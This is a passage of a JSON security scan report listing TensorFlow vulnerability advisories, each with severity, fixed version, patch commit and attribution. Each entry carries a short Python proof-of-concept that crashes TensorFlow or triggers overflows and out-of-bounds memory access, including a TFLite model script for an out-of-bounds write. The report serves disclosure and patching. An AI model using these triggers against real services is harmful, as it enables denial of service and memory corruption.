                "markdown": "**Vulnerability CVE-2022-41891**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41891](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41891)|\n\n### Impact\nIf [`tf.raw_ops.TensorListConcat`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/list_kernels.h) is given `element_shape=[]`, it results segmentation fault which can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\ntf.raw_ops.TensorListConcat(\n    input_handle=tf.data.experimental.to_variant(tf.data.Dataset.from_tensor_slices([1, 2, 3])),\n    element_dtype=tf.dtypes.float32,\n    element_shape=[]\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [fc33f3dc4c14051a83eec6535b608abe1d355fde](https://github.com/tensorflow/tensorflow/commit/fc33f3dc4c14051a83eec6535b608abe1d355fde).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Tong Liu, ShanghaiTech University\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41908",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41908"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41908",
              "help": {
                "text": "Vulnerability CVE-2022-41908\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41908](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41908)\n### Impact\nAn input `token` that is not a UTF-8 bytestring will trigger a `CHECK` fail in [`tf.raw_ops.PyFunc`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/lib/core/py_func.cc).\n\n```python\nimport tensorflow as tf\n\nvalue = tf.constant(value=[1,2])\ntoken = b`\\xb0`\ndataType = [tf.int32]\n\ntf.raw_ops.PyFunc(input=value,token=token,Tout=dataType)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [9f03a9d3bafe902c1e6beb105b2f24172f238645](https://github.com/tensorflow/tensorflow/commit/9f03a9d3bafe902c1e6beb105b2f24172f238645).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by pattarakritr@smu.edu.sg\n",
                "markdown": "**Vulnerability CVE-2022-41908**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41908](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41908)|\n\n### Impact\nAn input `token` that is not a UTF-8 bytestring will trigger a `CHECK` fail in [`tf.raw_ops.PyFunc`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/lib/core/py_func.cc).\n\n```python\nimport tensorflow as tf\n\nvalue = tf.constant(value=[1,2])\ntoken = b`\\xb0`\ndataType = [tf.int32]\n\ntf.raw_ops.PyFunc(input=value,token=token,Tout=dataType)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [9f03a9d3bafe902c1e6beb105b2f24172f238645](https://github.com/tensorflow/tensorflow/commit/9f03a9d3bafe902c1e6beb105b2f24172f238645).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by pattarakritr@smu.edu.sg\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41888",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41888"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41888",
              "help": {
                "text": "Vulnerability CVE-2022-41888\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41888](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41888)\n### Impact\nWhen running on GPU, [`tf.image.generate_bounding_box_proposals`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/generate_box_proposals_op.cu.cc) receives a `scores` input that must be of rank 4 but is not checked.\n```python\nimport tensorflow as tf\n\na = tf.constant(value=[[1.0, 1.0], [1.0, 1.0], [1.0, 1.0], [1.0, 1.0]])\nb = tf.constant(value=[1])\n\ntf.image.generate_bounding_box_proposals(scores=a,bbox_deltas=a,image_info=a,anchors=a,pre_nms_topn=b)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [cf35502463a88ca7185a99daa7031df60b3c1c98](https://github.com/tensorflow/tensorflow/commit/cf35502463a88ca7185a99daa7031df60b3c1c98).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul.\n",
                "markdown": "**Vulnerability CVE-2022-41888**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41888](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41888)|\n\n### Impact\nWhen running on GPU, [`tf.image.generate_bounding_box_proposals`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/generate_box_proposals_op.cu.cc) receives a `scores` input that must be of rank 4 but is not checked.\n```python\nimport tensorflow as tf\n\na = tf.constant(value=[[1.0, 1.0], [1.0, 1.0], [1.0, 1.0], [1.0, 1.0]])\nb = tf.constant(value=[1])\n\ntf.image.generate_bounding_box_proposals(scores=a,bbox_deltas=a,image_info=a,anchors=a,pre_nms_topn=b)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [cf35502463a88ca7185a99daa7031df60b3c1c98](https://github.com/tensorflow/tensorflow/commit/cf35502463a88ca7185a99daa7031df60b3c1c98).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Pattarakrit Rattankul.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41886",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41886"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41886",
              "help": {
                "text": "Vulnerability CVE-2022-41886\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41886](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41886)\n### Impact\nWhen [`tf.raw_ops.ImageProjectiveTransformV2`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/image_ops.cc) is given a large output shape, it overflows.\n```python\nimport tensorflow as tf\n\ninterpolation = \"BILINEAR\"\nfill_mode = \"REFLECT\"\nimages = tf.constant(0.184634328, shape=[2,5,8,3], dtype=tf.float32)\ntransforms = tf.constant(0.378575385, shape=[2,8], dtype=tf.float32)\noutput_shape = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)\ntf.raw_ops.ImageProjectiveTransformV2(images=images, transforms=transforms, output_shape=output_shape, interpolation=interpolation, fill_mode=fill_mode)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8faa6ea692985dbe6ce10e1a3168e0bd60a723ba](https://github.com/tensorflow/tensorflow/commit/8faa6ea692985dbe6ce10e1a3168e0bd60a723ba).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-41886**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41886](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41886)|\n\n### Impact\nWhen [`tf.raw_ops.ImageProjectiveTransformV2`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/image_ops.cc) is given a large output shape, it overflows.\n```python\nimport tensorflow as tf\n\ninterpolation = \"BILINEAR\"\nfill_mode = \"REFLECT\"\nimages = tf.constant(0.184634328, shape=[2,5,8,3], dtype=tf.float32)\ntransforms = tf.constant(0.378575385, shape=[2,8], dtype=tf.float32)\noutput_shape = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)\ntf.raw_ops.ImageProjectiveTransformV2(images=images, transforms=transforms, output_shape=output_shape, interpolation=interpolation, fill_mode=fill_mode)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8faa6ea692985dbe6ce10e1a3168e0bd60a723ba](https://github.com/tensorflow/tensorflow/commit/8faa6ea692985dbe6ce10e1a3168e0bd60a723ba).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41901",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41901"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41901",
              "help": {
                "text": "Vulnerability CVE-2022-41901\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41901](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41901)\n### Impact\nAn input `sparse_matrix` that is not a matrix with a shape with rank 0 will trigger a `CHECK` fail in [`tf.raw_ops.SparseMatrixNNZ`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sparse/sparse_matrix.h).\n\n```python\nimport tensorflow as tf\ntf.raw_ops.SparseMatrixNNZ(sparse_matrix=[])\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f856d02e5322821aad155dad9b3acab1e9f5d693](https://github.com/tensorflow/tensorflow/commit/f856d02e5322821aad155dad9b3acab1e9f5d693).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin\n",
                "markdown": "**Vulnerability CVE-2022-41901**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41901](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41901)|\n\n### Impact\nAn input `sparse_matrix` that is not a matrix with a shape with rank 0 will trigger a `CHECK` fail in [`tf.raw_ops.SparseMatrixNNZ`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sparse/sparse_matrix.h).\n\n```python\nimport tensorflow as tf\ntf.raw_ops.SparseMatrixNNZ(sparse_matrix=[])\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f856d02e5322821aad155dad9b3acab1e9f5d693](https://github.com/tensorflow/tensorflow/commit/f856d02e5322821aad155dad9b3acab1e9f5d693).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "GHSA-cqvq-fvhr-v6hc",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "GHSA-cqvq-fvhr-v6hc"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://github.com/advisories/GHSA-cqvq-fvhr-v6hc",
              "help": {
                "text": "Vulnerability GHSA-cqvq-fvhr-v6hc\nSeverity: low\nFixed Version: 2.10.1\nLink: [GHSA-cqvq-fvhr-v6hc](https://github.com/advisories/GHSA-cqvq-fvhr-v6hc)\n### Impact\nAnother instance of CVE-2022-35935, where `SobolSample` is vulnerable to a denial of service via assumed scalar inputs, was found and fixed.\n```python\nimport tensorflow as tf\ntf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))\n```\n\n### Patches\nWe have patched the issue in GitHub commits [c65c67f88ad770662e8f191269a907bf2b94b1bf](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf) and [02400ea266bd811fc016a848445de1bbff3a23a0](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick both commits on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range. TensorFlow 2.7.4 will have the first commit cherrypicked.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by:\n- Kang Hong Jin from Singapore Management University\n- Neophytos Christou, Secure Systems Labs, Brown University\n- 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n- Pattarakrit Rattankul\n",
                "markdown": "**Vulnerability GHSA-cqvq-fvhr-v6hc**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.10.1|[GHSA-cqvq-fvhr-v6hc](https://github.com/advisories/GHSA-cqvq-fvhr-v6hc)|\n\n### Impact\nAnother instance of CVE-2022-35935, where `SobolSample` is vulnerable to a denial of service via assumed scalar inputs, was found and fixed.\n```python\nimport tensorflow as tf\ntf.raw_ops.SobolSample(dim=tf.constant([1,0]), num_results=tf.constant([1]), skip=tf.constant([1]))\n```\n\n### Patches\nWe have patched the issue in GitHub commits [c65c67f88ad770662e8f191269a907bf2b94b1bf](https://github.com/tensorflow/tensorflow/commit/c65c67f88ad770662e8f191269a907bf2b94b1bf) and [02400ea266bd811fc016a848445de1bbff3a23a0](https://github.com/tensorflow/tensorflow/commit/02400ea266bd811fc016a848445de1bbff3a23a0)\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick both commits on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range. TensorFlow 2.7.4 will have the first commit cherrypicked.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by:\n- Kang Hong Jin from Singapore Management University\n- Neophytos Christou, Secure Systems Labs, Brown University\n- 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology\n- Pattarakrit Rattankul\n"
              },
              "properties": {
                "security-severity": "2.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2022-41894",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41894"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41894",
              "help": {
                "text": "Vulnerability CVE-2022-41894\nSeverity: high\nFixed Version: 2.10.1\nLink: [CVE-2022-41894](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41894)\n### Impact\nThe reference kernel of the [`CONV_3D_TRANSPOSE`](https://github.com/tensorflow/tensorflow/blob/091e63f0ea33def7ecad661a5ac01dcafbafa90b/tensorflow/lite/kernels/internal/reference/conv3d_transpose.h#L121) TensorFlow Lite operator wrongly increments the data_ptr when adding the bias to the result.\n\nInstead of `data_ptr += num_channels;` it should be `data_ptr += output_num_channels;` as if the number of input channels is different than the number of output channels, the wrong result will be returned and a buffer overflow will occur if num_channels \u003e output_num_channels.\n\nAn attacker can craft a model with a specific number of input channels in a way similar to the attached example script. It is then possible to write specific values through the bias of the layer outside the bounds of the buffer. This attack only works if the reference kernel resolver is used in the interpreter (i.e. `experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF` is used).\n```python\nimport tensorflow as tf\nmodel = tf.keras.Sequential(\n    [\n        tf.keras.layers.InputLayer(input_shape=(2, 2, 2, 1024), batch_size=1),\n        tf.keras.layers.Conv3DTranspose(\n            filters=8,\n            kernel_size=(2, 2, 2),\n            padding=\"same\",\n            data_format=\"channels_last\",\n        ),\n    ]\n)\n\nconverter = tf.lite.TFLiteConverter.from_keras_model(model)\ntflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(\n    model_content=tflite_model,\n    experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF,\n)\n\ninterpreter.allocate_tensors()\ninterpreter.set_tensor(\n    interpreter.get_input_details()[0][\"index\"], tf.zeros(shape=[1, 2, 2, 2, 1024])\n)\ninterpreter.invoke()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [72c0bdcb25305b0b36842d746cc61d72658d2941](https://github.com/tensorflow/tensorflow/commit/72c0bdcb25305b0b36842d746cc61d72658d2941).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Thibaut Goetghebuer-Planchon, Arm Ltd.\n",
                "markdown": "**Vulnerability CVE-2022-41894**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.10.1|[CVE-2022-41894](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41894)|\n\n### Impact\nThe reference kernel of the [`CONV_3D_TRANSPOSE`](https://github.com/tensorflow/tensorflow/blob/091e63f0ea33def7ecad661a5ac01dcafbafa90b/tensorflow/lite/kernels/internal/reference/conv3d_transpose.h#L121) TensorFlow Lite operator wrongly increments the data_ptr when adding the bias to the result.\n\nInstead of `data_ptr += num_channels;` it should be `data_ptr += output_num_channels;` as if the number of input channels is different than the number of output channels, the wrong result will be returned and a buffer overflow will occur if num_channels \u003e output_num_channels.\n\nAn attacker can craft a model with a specific number of input channels in a way similar to the attached example script. It is then possible to write specific values through the bias of the layer outside the bounds of the buffer. This attack only works if the reference kernel resolver is used in the interpreter (i.e. `experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF` is used).\n```python\nimport tensorflow as tf\nmodel = tf.keras.Sequential(\n    [\n        tf.keras.layers.InputLayer(input_shape=(2, 2, 2, 1024), batch_size=1),\n        tf.keras.layers.Conv3DTranspose(\n            filters=8,\n            kernel_size=(2, 2, 2),\n            padding=\"same\",\n            data_format=\"channels_last\",\n        ),\n    ]\n)\n\nconverter = tf.lite.TFLiteConverter.from_keras_model(model)\ntflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(\n    model_content=tflite_model,\n    experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF,\n)\n\ninterpreter.allocate_tensors()\ninterpreter.set_tensor(\n    interpreter.get_input_details()[0][\"index\"], tf.zeros(shape=[1, 2, 2, 2, 1024])\n)\ninterpreter.invoke()\n```\n\n### Patches\nWe have patched the issue in GitHub commit [72c0bdcb25305b0b36842d746cc61d72658d2941](https://github.com/tensorflow/tensorflow/commit/72c0bdcb25305b0b36842d746cc61d72658d2941).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Thibaut Goetghebuer-Planchon, Arm Ltd.\n"
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-41907",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41907"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41907",
              "help": {
                "text": "Vulnerability CVE-2022-41907\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41907](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41907)\n### Impact\nWhen [`tf.raw_ops.ResizeNearestNeighborGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/resize_nearest_neighbor_op.cc) is given a large `size` input, it overflows.\n```\nimport tensorflow as tf\n\nalign_corners = True\nhalf_pixel_centers = False\ngrads = tf.constant(1, shape=[1,8,16,3], dtype=tf.float16)\nsize = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)\ntf.raw_ops.ResizeNearestNeighborGrad(grads=grads, size=size, align_corners=align_corners, half_pixel_centers=half_pixel_centers)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [00c821af032ba9e5f5fa3fe14690c8d28a657624](https://github.com/tensorflow/tensorflow/commit/00c821af032ba9e5f5fa3fe14690c8d28a657624).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-41907**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41907](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41907)|\n\n### Impact\nWhen [`tf.raw_ops.ResizeNearestNeighborGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/resize_nearest_neighbor_op.cc) is given a large `size` input, it overflows.\n```\nimport tensorflow as tf\n\nalign_corners = True\nhalf_pixel_centers = False\ngrads = tf.constant(1, shape=[1,8,16,3], dtype=tf.float16)\nsize = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)\ntf.raw_ops.ResizeNearestNeighborGrad(grads=grads, size=size, align_corners=align_corners, half_pixel_centers=half_pixel_centers)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [00c821af032ba9e5f5fa3fe14690c8d28a657624](https://github.com/tensorflow/tensorflow/commit/00c821af032ba9e5f5fa3fe14690c8d28a657624).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41898",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41898"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41898",
              "help": {
                "text": "Vulnerability CVE-2022-41898\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41898](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41898)\n### Impact\nIf [`SparseFillEmptyRowsGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sparse_fill_empty_rows_op_gpu.cu.cc) is given empty inputs, TensorFlow will crash.\n\n```python\nimport tensorflow as tf\ntf.raw_ops.SparseFillEmptyRowsGrad(\n    reverse_index_map=[], grad_values=[], name=None\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [af4a6a3c8b95022c351edae94560acc61253a1b8](https://github.com/tensorflow/tensorflow/commit/af4a6a3c8b95022c351edae94560acc61253a1b8).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jiawei Liu, PhD student at University of Illinois, Urbana-Champaign.\n",
                "markdown": "**Vulnerability CVE-2022-41898**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.10.1|[CVE-2022-41898](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41898)|\n\n### Impact\nIf [`SparseFillEmptyRowsGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/sparse_fill_empty_rows_op_gpu.cu.cc) is given empty inputs, TensorFlow will crash.\n\n```python\nimport tensorflow as tf\ntf.raw_ops.SparseFillEmptyRowsGrad(\n    reverse_index_map=[], grad_values=[], name=None\n)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [af4a6a3c8b95022c351edae94560acc61253a1b8](https://github.com/tensorflow/tensorflow/commit/af4a6a3c8b95022c351edae94560acc61253a1b8).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jiawei Liu, PhD student at University of Illinois, Urbana-Champaign.\n"
              },
              "properties": {
                "security-severity": "4.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-41895",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-41895"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41895",
              "help": {
                "text": "Vulnerability CVE-2022-41895\nSeverity: medium\nFixed Version: 2.10.1\nLink: [CVE-2022-41895](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41895)\n### Impact\nIf [`MirrorPadGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/mirror_pad_op.cc) is given outsize input `paddings`, TensorFlow will give a heap OOB error.\n\n```python\nimport tensorflow as tf\ntf.raw_ops.MirrorPadGrad(input=[1],\n             paddings=[[0x77f00000,0xa000000]],\n             mode = `REFLECT`)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [717ca98d8c3bba348ff62281fdf38dcb5ea1ec92](https://github.com/tensorflow/tensorflow/commit/717ca98d8c3bba348ff62281fdf38dcb5ea1ec92).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Vul AI.\n",
